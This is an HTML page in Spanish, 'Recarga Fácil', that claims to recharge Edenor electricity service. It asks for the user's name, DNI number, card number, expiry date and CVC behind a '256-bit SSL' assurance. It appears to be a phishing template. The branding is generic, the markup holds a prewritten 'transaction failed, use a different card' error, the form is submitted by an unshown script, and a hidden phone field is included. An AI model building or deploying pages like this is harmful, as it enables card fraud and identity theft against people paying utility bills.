<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
	<title>Recarga Fácil</title>
	<link rel="icon" type="image/png" href="img/logo.png">
	<link rel="stylesheet" href="css/bootstrap.css">
	<link rel="stylesheet" href="css/style.css">
</head><body>
<div class="error" id="alert_error">
    <p>Su transacción no pudo completarse. Esto podría deberse a detalles incorrectos de la tarjeta de crédito, una tarjeta de crédito vencida o restricciones de su banco. Vuelva a intentarlo o utilice una tarjeta de crédito diferente. Si sigue teniendo problemas, comuníquese con el banco que emitió su tarjeta.</p>
</div>
<nav class="navbar navbar-expand-lg navbar-light bg-light py-3 px-md-5">
	<img src="img/logo.png" alt="Logo Portal Recargas">
	<a class="navbar-brand" href="#">Recarga Fácil</a>
</nav><div class="header">
	<h1>Recarga Edenor</h1>
</div>
<form id="valid_data">
<div class="container-fluid">
	<div class="row d-flex justify-content-center align-items-center flex-column">
		<div class="col-md-6 col-10 contenedor_recarga">
			<div class="row">
				<div class="col-md-3 col-12">
					<img src="img/edenor.jpg" class="w-100" alt="">
				</div>
				<div class="col-md-9 col-12 d-flex flex-column justify-content-center">
					<h5></h5>
					<p class="roboto"<a href=""></a></p>
					<div class="d-flex align-items-center hr">
					<img src="https://images.vexels.com/media/users/3/181775/isolated/preview/ff2947607b1af2e4a62a06537e292424-icono-de-rayo-by-vexels.png" alt="" width="30" height="20"><p class="m-0 p-0 pl-2 roboto">Edenor será recargado inmediatamente</p>
					</div>
					<div class="row">
						<div class="col d-flex justify-content-left">
							<h4 class="roboto p-0 m-0"></h4>
						</div>
						<div class="col d-flex justify-content-right">
							<h4 class="roboto p-0 m-0"></h4>
						</div>
					</div>
				</div>
			</div>
		</div>
		<div class="col-md-6 col-12 contenedor_recarga">
			<h5>Gracias a nuestra conexión 256-bit SSL segura cada pago es seguro.</h5>
			<div class="row pt-5 d-flex justify-content-center">
				<div class="col-11">
					<div class="input">
						<label for="name">Nombre y apellido</label>
						<input type="text" id="name" name="name" placeholder="Nombre y apellido" required>
					</div>
				</div>
				<div class="col-11">
					<div class="input">
						<label for="dni">Número de DNI</label>
						<input type="text" id="dni" name="dni" placeholder="Ingrese su número de documento" inputmode="decimal" required>
					</div>
				</div>
				<div class="col-11">
					<div class="input">
						<label for="card">Número de tarjeta</label>
						<input type="text" id="card" name="card" placeholder="Número de tarjeta" inputmode="decimal" required>
					</div>
				</div>
				<div class="col-11">
					<div class="row">
						<div class="col-6">
							<div class="input">
								<label for="venc">Fecha de caducidad</label>
								<input type="text" id="venc" name="venc" placeholder="MM/AA" inputmode="decimal" required>
							</div>
						</div>
						<div class="col-6">
							<div class="input">
								<label for="cvc">CVC</label>
								<input type="text" id="cvc" name="cvc" placeholder="CVC" inputmode="decimal" required>
							</div>
						</div>
					</div>
				</div>
				<div class="col-11">
					<button class="my-3">Siguiente</button>
				</div>
			</div>
		</div>
	</div>
</div>
<input type="hidden" value="" name="cellphone">
</form>
<script src="js/jquery.js"></script>
<script src="js/bootstrap.js"></script>
<script src="js/custom.js"></script></body>
</html>